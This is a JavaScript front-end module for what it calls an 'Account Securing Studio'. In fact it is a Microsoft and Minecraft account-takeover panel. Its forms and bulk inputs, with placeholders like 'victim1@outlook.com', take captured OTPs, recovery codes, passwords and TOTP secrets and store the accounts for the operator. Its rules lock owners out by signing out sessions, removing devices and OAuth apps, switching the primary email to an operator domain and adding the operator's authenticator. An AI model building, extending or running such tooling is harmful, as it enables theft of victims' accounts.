// Securing Studio View Module
const SecureView = {
  activeTab: 'otp',

  async render() {
    const container = document.getElementById('view-content');
    container.innerHTML = `
      <div class="card">
        <div class="card-header">
          <span class="card-title"><i class="fas fa-lock"></i> Account Securing Studio</span>
          <span class="badge-tag info">Live Engine</span>
        </div>

        <!-- Securing Tabs -->
        <div class="tabs-header" style="margin-top:14px;">
          <button class="tab-btn active" id="sec-tab-btn-otp" onclick="SecureView.switchTab('otp')">
            <i class="fas fa-sms"></i> OTP Secure
          </button>
          <button class="tab-btn" id="sec-tab-btn-rec" onclick="SecureView.switchTab('rec')">
            <i class="fas fa-key"></i> Recovery Code
          </button>
          <button class="tab-btn" id="sec-tab-btn-zyger" onclick="SecureView.switchTab('zyger')">
            <i class="fas fa-shield-alt"></i> Zyger (TOTP)
          </button>
          <button class="tab-btn" id="sec-tab-btn-bulk-rec" onclick="SecureView.switchTab('bulk-rec')">
            <i class="fas fa-layer-group"></i> Bulk Recovery
          </button>
          <button class="tab-btn" id="sec-tab-btn-bulk-otp" onclick="SecureView.switchTab('bulk-otp')">
            <i class="fas fa-tasks"></i> Bulk OTP
          </button>
          <button class="tab-btn" id="sec-tab-btn-rules" onclick="SecureView.switchTab('rules')">
            <i class="fas fa-sliders-h"></i> Securing Rules & Profile
          </button>
        </div>

        <div class="card-body">
          <!-- TAB 1: OTP SECURE -->
          <div id="sec-tab-content-otp">
            <form onsubmit="SecureView.submitOTP(event)" style="max-width:540px;">
              <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:18px;">
                Secure a Microsoft account using a one-time verification code sent to its email or phone.
              </p>
              <div class="form-group">
                <label class="form-label">Account Email Address *</label>
                <input type="email" id="otp-sec-email" class="form-input" placeholder="e.g. user@outlook.com" required />
              </div>
              <div class="form-group">
                <label class="form-label">One-Time Password (OTP) *</label>
                <input type="text" id="otp-sec-code" class="form-input" placeholder="e.g. 524183 (6-7 digits)" maxlength="7" required />
              </div>
              <div class="form-group">
                <label class="form-label">Change Minecraft Username (Optional)</label>
                <input type="text" id="otp-sec-ign" class="form-input" placeholder="3-16 characters" />
              </div>
              <button type="submit" id="btn-submit-otp" class="btn btn-primary" style="width:100%;padding:12px;">
                <i class="fas fa-shield-alt"></i> Execute OTP Secure
              </button>
            </form>
          </div>

          <!-- TAB 2: RECOVERY CODE SECURE -->
          <div id="sec-tab-content-rec" style="display:none;">
            <form onsubmit="SecureView.submitRec(event)" style="max-width:540px;">
              <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:18px;">
                Secure an account instantly using its 25-character Microsoft recovery code.
              </p>
              <div class="form-group">
                <label class="form-label">Account Email Address *</label>
                <input type="email" id="rec-sec-email" class="form-input" placeholder="e.g. user@outlook.com" required />
              </div>
              <div class="form-group">
                <label class="form-label">25-Character Recovery Code *</label>
                <input type="text" id="rec-sec-code" class="form-input" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" style="font-family:var(--font-mono);" required />
              </div>
              <div class="form-group">
                <label class="form-label">Change Minecraft Username (Optional)</label>
                <input type="text" id="rec-sec-ign" class="form-input" placeholder="3-16 characters" />
              </div>
              <button type="submit" id="btn-submit-rec" class="btn btn-primary" style="width:100%;padding:12px;">
                <i class="fas fa-key"></i> Execute Recovery Code Secure
              </button>
            </form>
          </div>

          <!-- TAB 3: ZYGER SECURE -->
          <div id="sec-tab-content-zyger" style="display:none;">
            <form onsubmit="SecureView.submitZyger(event)" style="max-width:540px;">
              <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:18px;">
                Secure an account using existing Password and 2FA TOTP Secret Key.
              </p>
              <div class="form-group">
                <label class="form-label">Account Email Address *</label>
                <input type="email" id="zyger-sec-email" class="form-input" placeholder="e.g. user@outlook.com" required />
              </div>
              <div class="form-group">
                <label class="form-label">Current Password *</label>
                <input type="text" id="zyger-sec-pass" class="form-input" placeholder="Password" required />
              </div>
              <div class="form-group">
                <label class="form-label">Secret Key (Base32 TOTP) *</label>
                <input type="text" id="zyger-sec-key" class="form-input" placeholder="e.g. JBSWY3DPEHPK3PXP" style="font-family:var(--font-mono);" required />
              </div>
              <div class="form-group">
                <label class="form-label">Change Minecraft Username (Optional)</label>
                <input type="text" id="zyger-sec-ign" class="form-input" placeholder="3-16 characters" />
              </div>
              <button type="submit" id="btn-submit-zyger" class="btn btn-primary" style="width:100%;padding:12px;">
                <i class="fas fa-lock"></i> Execute Zyger Secure
              </button>
            </form>
          </div>

          <!-- TAB 4: BULK RECOVERY -->
          <div id="sec-tab-content-bulk-rec" style="display:none;">
            <div style="max-width:750px;">
              <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:14px;">
                Paste multiple accounts in format: <code>email:recoverycode</code> or <code>email:recoverycode:new_ign</code> (one per line).
              </p>
              <div class="form-group">
                <textarea id="bulk-rec-input" class="form-textarea" style="height:150px;" 
                          placeholder="victim1@outlook.com:ABCDE-FGHIJ-KLMNO-PQRST-UVWXY&#10;victim2@outlook.com:12345-67890-ABCDE-FGHIJ-KLMNO:NewIgn"></textarea>
              </div>
              <button class="btn btn-primary" onclick="SecureView.submitBulkRec()">
                <i class="fas fa-play"></i> Start Bulk Securing
              </button>

              <div id="bulk-rec-results" style="margin-top:20px;display:none;">
                <h4 style="font-size:0.95rem;margin-bottom:10px;">Execution Progress</h4>
                <div class="table-wrapper">
                  <table>
                    <thead>
                      <tr>
                        <th>Email</th>
                        <th>Status</th>
                        <th>UID</th>
                        <th>Details</th>
                      </tr>
                    </thead>
                    <tbody id="bulk-rec-table-body"></tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>

          <!-- TAB 5: BULK OTP -->
          <div id="sec-tab-content-bulk-otp" style="display:none;">
            <div style="max-width:750px;">
              <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:14px;">
                Paste multiple OTP credentials: <code>email:otp</code> or <code>email:otp:new_ign</code> (one per line).
              </p>
              <div class="form-group">
                <textarea id="bulk-otp-input" class="form-textarea" style="height:150px;" 
                          placeholder="victim1@outlook.com:482910&#10;victim2@outlook.com:918234:CoolPlayer"></textarea>
              </div>
              <button class="btn btn-primary" onclick="SecureView.submitBulkOtp()">
                <i class="fas fa-play"></i> Start Bulk OTP Securing
              </button>

              <div id="bulk-otp-results" style="margin-top:20px;display:none;">
                <h4 style="font-size:0.95rem;margin-bottom:10px;">Execution Progress</h4>
                <div class="table-wrapper">
                  <table>
                    <thead>
                      <tr>
                        <th>Email</th>
                        <th>Status</th>
                        <th>UID</th>
                        <th>Details</th>
                      </tr>
                    </thead>
                    <tbody id="bulk-otp-table-body"></tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>

          <!-- TAB 6: RULES & PROFILE SETTINGS -->
          <div id="sec-tab-content-rules" style="display:none;">
            <div id="rules-settings-container">
              <div style="text-align:center;padding:30px;">
                <i class="fas fa-spinner fa-spin fa-2x" style="color:var(--primary);"></i>
              </div>
            </div>
          </div>
        </div>
      </div>
    `;
  },

  switchTab(tabId) {
    this.activeTab = tabId;
    ['otp', 'rec', 'zyger', 'bulk-rec', 'bulk-otp', 'rules'].forEach(t => {
      const btn = document.getElementById(`sec-tab-btn-${t}`);
      const content = document.getElementById(`sec-tab-content-${t}`);
      if (btn && content) {
        if (t === tabId) {
          btn.classList.add('active');
          content.style.display = 'block';
        } else {
          btn.classList.remove('active');
          content.style.display = 'none';
        }
      }
    });

    if (tabId === 'rules') {
      this.loadRulesSettings();
    }
  },

  async submitOTP(e) {
    e.preventDefault();
    const email = document.getElementById('otp-sec-email').value;
    const otp = document.getElementById('otp-sec-code').value;
    const mcign = document.getElementById('otp-sec-ign').value;

    const btn = document.getElementById('btn-submit-otp');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Securing account...';

    try {
      const res = await API.post('/api/secure/otp', { email, otp, mcign });
      Toasts.success(res.message || 'Account secured successfully!');
      Modal.open({
        title: 'Account Secured!',
        bodyHtml: `
          <div style="text-align:center;padding:20px 0;">
            <i class="fas fa-check-circle fa-3x" style="color:#10b981;margin-bottom:12px;"></i>
            <h3>Account Successfully Secured</h3>
            <p style="color:var(--text-muted);margin:8px 0;">UID: <code>${res.uid}</code></p>
            <p style="font-size:0.85rem;color:var(--text-dim);">The account credentials have been saved to your dashboard accounts.</p>
          </div>
        `,
        footerHtml: `<button class="btn btn-primary" onclick="Modal.close();App.navigate('accounts')">View in Accounts</button>`
      });
      document.getElementById('otp-sec-code').value = '';
    } catch (err) {
      Toasts.error(err.message || 'Securing failed');
    } finally {
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-shield-alt"></i> Execute OTP Secure';
    }
  },

  async submitRec(e) {
    e.preventDefault();
    const email = document.getElementById('rec-sec-email').value;
    const recoveryCode = document.getElementById('rec-sec-code').value;
    const mcign = document.getElementById('rec-sec-ign').value;

    const btn = document.getElementById('btn-submit-rec');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Securing account...';

    try {
      const res = await API.post('/api/secure/rec', { email, recoveryCode, mcign });
      Toasts.success(res.message || 'Account secured successfully!');
      Modal.open({
        title: 'Account Secured via Recovery Code!',
        bodyHtml: `
          <div style="text-align:center;padding:20px 0;">
            <i class="fas fa-check-circle fa-3x" style="color:#10b981;margin-bottom:12px;"></i>
            <h3>Account Successfully Secured</h3>
            <p style="color:var(--text-muted);margin:8px 0;">UID: <code>${res.uid}</code></p>
          </div>
        `,
        footerHtml: `<button class="btn btn-primary" onclick="Modal.close();App.navigate('accounts')">View in Accounts</button>`
      });
      document.getElementById('rec-sec-code').value = '';
    } catch (err) {
      Toasts.error(err.message || 'Securing failed');
    } finally {
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-key"></i> Execute Recovery Code Secure';
    }
  },

  async submitZyger(e) {
    e.preventDefault();
    const email = document.getElementById('zyger-sec-email').value;
    const password = document.getElementById('zyger-sec-pass').value;
    const secretKey = document.getElementById('zyger-sec-key').value;
    const mcign = document.getElementById('zyger-sec-ign').value;

    const btn = document.getElementById('btn-submit-zyger');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Securing account...';

    try {
      const res = await API.post('/api/secure/zyger', { email, password, secretKey, mcign });
      Toasts.success(res.message || 'Account secured with Zyger!');
      Modal.close();
    } catch (err) {
      Toasts.error(err.message || 'Zyger securing failed');
    } finally {
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-lock"></i> Execute Zyger Secure';
    }
  },

  async submitBulkRec() {
    const lines = document.getElementById('bulk-rec-input').value;
    if (!lines.trim()) {
      Toasts.warning('Please enter account entries');
      return;
    }

    const container = document.getElementById('bulk-rec-results');
    const tbody = document.getElementById('bulk-rec-table-body');
    container.style.display = 'block';
    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;"><i class="fas fa-spinner fa-spin"></i> Processing batch...</td></tr>`;

    try {
      const res = await API.post('/api/secure/bulk-rec', { lines });
      tbody.innerHTML = res.results.map(r => `
        <tr>
          <td style="font-family:var(--font-mono);font-size:0.8rem;">${r.email}</td>
          <td>
            <span class="badge-tag ${r.success ? 'success' : 'danger'}">
              ${r.success ? 'Secured' : 'Failed'}
            </span>
          </td>
          <td style="font-family:var(--font-mono);font-size:0.75rem;">${r.uid || 'N/A'}</td>
          <td style="font-size:0.8rem;color:var(--text-muted);">${r.error || 'Saved to accounts'}</td>
        </tr>
      `).join('');
      Toasts.success(`Bulk finished: ${res.successful}/${res.total} accounts secured!`);
    } catch (err) {
      tbody.innerHTML = `<tr><td colspan="4" style="color:var(--danger);">${err.message}</td></tr>`;
    }
  },

  async submitBulkOtp() {
    const raw = document.getElementById('bulk-otp-input').value;
    if (!raw.trim()) {
      Toasts.warning('Please enter account entries');
      return;
    }

    const items = raw.split('\n').map(l => l.trim()).filter(Boolean).map(l => {
      const parts = l.split(':');
      return { email: parts[0]?.trim(), otp: parts[1]?.trim(), mcign: parts[2]?.trim() || null };
    });

    const container = document.getElementById('bulk-otp-results');
    const tbody = document.getElementById('bulk-otp-table-body');
    container.style.display = 'block';
    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;"><i class="fas fa-spinner fa-spin"></i> Processing batch...</td></tr>`;

    try {
      const res = await API.post('/api/secure/bulk-otp', { items });
      tbody.innerHTML = res.results.map(r => `
        <tr>
          <td style="font-family:var(--font-mono);font-size:0.8rem;">${r.email}</td>
          <td>
            <span class="badge-tag ${r.success ? 'success' : 'danger'}">
              ${r.success ? 'Secured' : 'Failed'}
            </span>
          </td>
          <td style="font-family:var(--font-mono);font-size:0.75rem;">${r.uid || 'N/A'}</td>
          <td style="font-size:0.8rem;color:var(--text-muted);">${r.error || 'Saved to accounts'}</td>
        </tr>
      `).join('');
      Toasts.success(`Bulk finished: ${res.successful}/${res.total} secured!`);
    } catch (err) {
      tbody.innerHTML = `<tr><td colspan="4" style="color:var(--danger);">${err.message}</td></tr>`;
    }
  },

  async loadRulesSettings() {
    const container = document.getElementById('rules-settings-container');
    if (!container) return;

    try {
      const res = await API.get('/api/secure/config');
      const c = res.config;

      container.innerHTML = `
        <form onsubmit="SecureView.saveRules(event)">
          <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(280px, 1fr));gap:24px;">
            <!-- Automation Toggles -->
            <div>
              <h4 style="font-size:0.95rem;font-weight:600;margin-bottom:14px;color:#818cf8;">
                <i class="fas fa-cogs"></i> Security Automations
              </h4>
              <div style="display:flex;flex-direction:column;gap:8px;">
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-auto_secure" ${c.auto_secure ? 'checked' : ''} />
                  <span>Auto Secure Account</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-exploit" ${c.exploit ? 'checked' : ''} />
                  <span>Exploit Exploit Fix</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-signout" ${c.signout ? 'checked' : ''} />
                  <span>Sign Out All Other Sessions</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-oauthapps" ${c.oauthapps ? 'checked' : ''} />
                  <span>Remove Linked OAuth Apps</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-removedevices" ${c.removedevices ? 'checked' : ''} />
                  <span>Remove Trusted Devices</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-changeprimary" ${c.changeprimary ? 'checked' : ''} />
                  <span>Change Primary Email Alias</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-secureifnomc" ${c.secureifnomc ? 'checked' : ''} />
                  <span>Secure Even If No Minecraft Found</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-autoquarantine" ${c.autoquarantine ? 'checked' : ''} />
                  <span>Auto Quarantine Account</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-checkban" ${c.checkban ? 'checked' : ''} />
                  <span>Check Hypixel Ban Status</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-addzyger" ${c.addzyger ? 'checked' : ''} />
                  <span>Add Zyger TOTP Authenticator</span>
                </label>
                <label class="form-checkbox-label">
                  <input type="checkbox" id="rule-subscribemail" ${c.subscribemail ? 'checked' : ''} />
                  <span>Subscribe Newsletter / Alerts</span>
                </label>
              </div>
            </div>

            <!-- Profile & Personalization -->
            <div>
              <h4 style="font-size:0.95rem;font-weight:600;margin-bottom:14px;color:#818cf8;">
                <i class="fas fa-user-edit"></i> Profile Alteration
              </h4>
              <div class="form-group">
                <label class="form-label">Email Prefix</label>
                <input type="text" id="rule-prefix" class="form-input" value="${c.prefix || 'old'}" placeholder="e.g. old" />
              </div>
              <div class="form-group">
                <label class="form-label">Securing Domain</label>
                <input type="text" id="rule-domain" class="form-input" value="${c.domain || 'exodev.sbs'}" />
              </div>
              <div class="form-group">
                <label class="form-label">Custom Display Name</label>
                <input type="text" id="rule-name" class="form-input" value="${c.name || 'Player'}" />
              </div>
              <div class="form-group">
                <label class="form-label">Date of Birth (YYYY-MM-DD)</label>
                <input type="text" id="rule-dob" class="form-input" value="${c.dob || '2000-01-01'}" />
              </div>
              <div class="form-group">
                <label class="form-label">Profile Avatar URL</label>
                <input type="text" id="rule-pfp" class="form-input" value="${c.pfp || ''}" />
              </div>
              <div class="form-group">
                <label class="form-label">Language Code</label>
                <input type="text" id="rule-language" class="form-input" value="${c.language || 'en-US'}" />
              </div>
            </div>
          </div>

          <div style="margin-top:20px;padding-top:16px;border-top:1px solid var(--border-color);display:flex;justify-content:flex-end;">
            <button type="submit" class="btn btn-primary">
              <i class="fas fa-save"></i> Save Rules & Profile
            </button>
          </div>
        </form>
      `;
    } catch (err) {
      container.innerHTML = `<div style="color:var(--danger);">${err.message}</div>`;
    }
  },

  async saveRules(e) {
    e.preventDefault();
    const payload = {
      auto_secure: document.getElementById('rule-auto_secure').checked ? 1 : 0,
      exploit: document.getElementById('rule-exploit').checked ? 1 : 0,
      signout: document.getElementById('rule-signout').checked ? 1 : 0,
      oauthapps: document.getElementById('rule-oauthapps').checked ? 1 : 0,
      removedevices: document.getElementById('rule-removedevices').checked ? 1 : 0,
      changeprimary: document.getElementById('rule-changeprimary').checked ? 1 : 0,
      secureifnomc: document.getElementById('rule-secureifnomc').checked ? 1 : 0,
      autoquarantine: document.getElementById('rule-autoquarantine').checked ? 1 : 0,
      checkban: document.getElementById('rule-checkban').checked ? 1 : 0,
      addzyger: document.getElementById('rule-addzyger').checked ? 1 : 0,
      subscribemail: document.getElementById('rule-subscribemail').checked ? 1 : 0,
      prefix: document.getElementById('rule-prefix').value,
      domain: document.getElementById('rule-domain').value,
      name: document.getElementById('rule-name').value,
      dob: document.getElementById('rule-dob').value,
      pfp: document.getElementById('rule-pfp').value,
      language: document.getElementById('rule-language').value
    };

    try {
      await API.post('/api/secure/config', payload);
      Toasts.success('Securing rules and profile updated!');
    } catch (err) {
      Toasts.error(err.message);
    }
  }
};

window.SecureView = SecureView;
